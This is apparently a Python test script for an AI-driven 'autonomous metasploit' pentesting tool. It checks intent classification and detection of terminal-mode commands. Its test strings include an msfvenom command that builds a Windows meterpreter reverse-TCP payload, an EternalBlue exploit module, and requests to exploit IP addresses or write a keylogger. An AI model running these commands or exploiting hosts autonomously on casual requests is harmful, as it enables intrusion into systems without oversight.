#!/usr/bin/env python3
"""
Test script for the autonomous metasploit system.

Tests the key components:
1. Semantic Intent Classifier
2. Autonomous Pentesting Assistant
3. Metasploit Executor
4. Terminal Emulator
5. Live UI transformation
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "src"))


def test_semantic_intent_classifier():
    """Test semantic intent classification."""
    print("🧪 Testing Semantic Intent Classifier...")

    try:
        from spectral.semantic_intent_classifier import (
            SemanticIntent,
            SemanticIntentClassifier,
        )

        classifier = SemanticIntentClassifier()

        # Test cases
        test_cases = [
            ("exploit 192.168.1.100 windows 10 with smb", SemanticIntent.EXPLOITATION),
            ("scan target for open ports", SemanticIntent.RECONNAISSANCE),
            ("create python keylogger", SemanticIntent.CODE),
            ("research CVE-2021-41773", SemanticIntent.RESEARCH),
            ("hello how are you", SemanticIntent.CHAT),
        ]

        all_passed = True
        for user_input, expected_intent in test_cases:
            intent, confidence = classifier.classify(user_input)
            passed = intent == expected_intent
            status = "✅" if passed else "❌"
            print(
                f"  {status} '{user_input}' → {intent.value} (conf: {confidence:.2f})"
            )
            if not passed:
                print(f"     Expected: {expected_intent.value}")
                all_passed = False

        return all_passed

    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False


def test_autonomous_pentesting_assistant():
    """Test autonomous pentesting assistant."""
    print("\n🎯 Testing Autonomous Pentesting Assistant...")

    try:
        from spectral.autonomous_pentesting_assistant import (
            AutonomousPentestingAssistant,
        )

        assistant = AutonomousPentestingAssistant()

        # Test context clearing
        test_messages = [
            "I want to test 192.168.1.100",
            "forget this target",
            "new target 10.0.0.1",
            "exploit this machine with windows",
        ]

        for msg in test_messages:
            response = assistant.handle_request(msg)
            print(f"  📝 Input: {msg}")
            print(f"  🤖 Response: {response[:100]}...")
            print()

        return True

    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False


def test_metasploit_executor():
    """Test metasploit executor (without actual metasploit)."""
    print("\n💻 Testing Metasploit Executor...")

    try:
        from spectral.metasploit_executor import MetasploitExecutor, PayloadType

        executor = MetasploitExecutor()

        # Test detection
        test_commands = [
            "msfconsole -r test.rc",
            "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe",
            "use exploit/windows/smb/ms17_010_eternalblue",
            "set PAYLOAD windows/meterpreter/reverse_tcp",
            "nmap -sV 192.168.1.100",  # Should not trigger terminal mode
        ]

        for cmd in test_commands:
            should_trigger = executor.detect_terminal_mode(cmd)
            status = "🟢" if should_trigger else "🔴"
            print(f"  {status} '{cmd}' → Terminal mode: {should_trigger}")

        return True

    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False


def test_terminal_emulator():
    """Test terminal emulator."""
    print("\n🖥️ Testing Terminal Emulator...")

    try:
        # Test that the module can be imported and basic functions work
        from spectral.gui.terminal_emulator import TerminalEmulator, TerminalManager

        # Test terminal manager
        manager = TerminalManager()
        print("  ✅ TerminalManager created successfully")

        return True

    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False


def test_sandbox_viewer():
    """Test sandbox viewer integration."""
    print("\n📺 Testing Sandbox Viewer...")

    try:
        from spectral.gui.sandbox_viewer import SandboxViewer

        # Test terminal mode detection without creating GUI components
        viewer = SandboxViewer(None)  # No GUI needed for this test

        test_commands = [
            "msfconsole",
            "exploit windows/smb",
            "generate payload",
            "regular python code",  # Should not trigger terminal mode
        ]

        for cmd in test_commands:
            should_trigger = viewer.detect_terminal_mode(cmd)
            status = "🟢" if should_trigger else "🔴"
            print(f"  {status} '{cmd}' → Terminal mode: {should_trigger}")

        return True

    except Exception as e:
        # Check if it's just a display error (expected in headless environment)
        if "couldn't connect to display" in str(e) or "No display" in str(e):
            print("  ℹ️ GUI test skipped (headless environment)")
            return True
        else:
            print(f"  ❌ Error: {e}")
            return False


def test_execution_router():
    """Test execution router pentesting detection."""
    print("\n🗺️ Testing Execution Router...")

    try:
        from spectral.execution_router import ExecutionRouter

        router = ExecutionRouter()

        # Test pentesting request detection
        test_cases = [
            ("exploit 192.168.1.100 windows 10", True),
            ("scan target for vulnerabilities", True),
            ("create a python script", False),
            ("hello world", False),
            ("generate reverse shell payload", True),
        ]

        all_passed = True
        for user_input, expected in test_cases:
            is_pentest = router.is_pentesting_request(user_input)
            passed = is_pentest == expected
            status = "✅" if passed else "❌"
            print(f"  {status} '{user_input}' → Pentesting: {is_pentest}")
            if not passed:
                print(f"     Expected: {expected}")
                all_passed = False

        return all_passed

    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False


def main():
    """Run all tests."""
    print("🚀 Testing Autonomous Metasploit System")
    print("=" * 50)

    tests = [
        ("Semantic Intent Classifier", test_semantic_intent_classifier),
        ("Autonomous Pentesting Assistant", test_autonomous_pentesting_assistant),
        ("Metasploit Executor", test_metasploit_executor),
        ("Terminal Emulator", test_terminal_emulator),
        ("Sandbox Viewer", test_sandbox_viewer),
        ("Execution Router", test_execution_router),
    ]

    results = []
    for test_name, test_func in tests:
        try:
            result = test_func()
            results.append((test_name, result))
        except Exception as e:
            print(f"  ❌ {test_name} failed with exception: {e}")
            results.append((test_name, False))

    # Summary
    print("\n" + "=" * 50)
    print("📊 Test Summary:")

    passed = 0
    total = len(results)

    for test_name, result in results:
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"  {status} {test_name}")
        if result:
            passed += 1

    print(f"\nResults: {passed}/{total} tests passed")

    if passed == total:
        print("🎉 All tests passed! Autonomous metasploit system is ready.")
        return True
    else:
        print("⚠️ Some tests failed. Check the implementation.")
        return False


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
